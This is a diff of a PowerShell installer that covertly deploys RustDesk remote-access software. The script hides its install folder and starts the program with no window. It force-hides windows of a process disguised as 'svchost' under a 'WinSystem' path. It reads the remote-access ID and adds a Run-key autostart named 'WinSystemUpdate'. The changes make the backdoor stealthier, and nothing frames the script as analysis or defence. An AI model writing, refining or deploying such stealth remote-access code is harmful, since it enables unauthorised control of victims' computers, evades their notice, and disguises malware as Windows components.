@@ -58,15 +58,7 @@ key_confirmed = true
     # 4. Hide folder
     try { $f = Get-Item $DEST -Force; $f.Attributes = $f.Attributes -bor 2 -bor 4 } catch {}
 
-    # 5. Start RustDesk hidden
-    $psi = New-Object System.Diagnostics.ProcessStartInfo
-    $psi.FileName=$EXE; $psi.WorkingDirectory=$DEST
-    $psi.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden
-    $psi.UseShellExecute=$true
-    [System.Diagnostics.Process]::Start($psi) | Out-Null
-    Start-Sleep 5
-
-    # 6. Get ID
+    # 5. Get ID first (silent, no window)
     $psiId = New-Object System.Diagnostics.ProcessStartInfo
     $psiId.FileName=$EXE; $psiId.Arguments='--get-id'
     $psiId.UseShellExecute=$false; $psiId.RedirectStandardOutput=$true
@@ -76,7 +68,20 @@ key_confirmed = true
     $prId.WaitForExit(8000) | Out-Null
     $RDID = $outT.Result.Trim()
 
-    # 7. Auto-start on boot via registry (no admin needed)
+    # 6. Now start RustDesk as background service - hidden, no UI
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName=$EXE; $psi.WorkingDirectory=$DEST
+    $psi.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden
+    $psi.UseShellExecute=$false
+    $psi.CreateNoWindow=$true
+    [System.Diagnostics.Process]::Start($psi) | Out-Null
+    Start-Sleep 2
+
+    # 7. Force hide any window that slipped through
+    Add-Type -Name W2 -Namespace N2 -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c);' -EA SilentlyContinue
+    Get-Process svchost -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | ForEach-Object { [N2.W2]::ShowWindow($_.MainWindowHandle, 0) | Out-Null }
+
+    # 8. Auto-start on boot via registry (no admin needed)
     $reg = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
     Set-ItemProperty $reg 'WinSystemUpdate' $EXE -Force
 
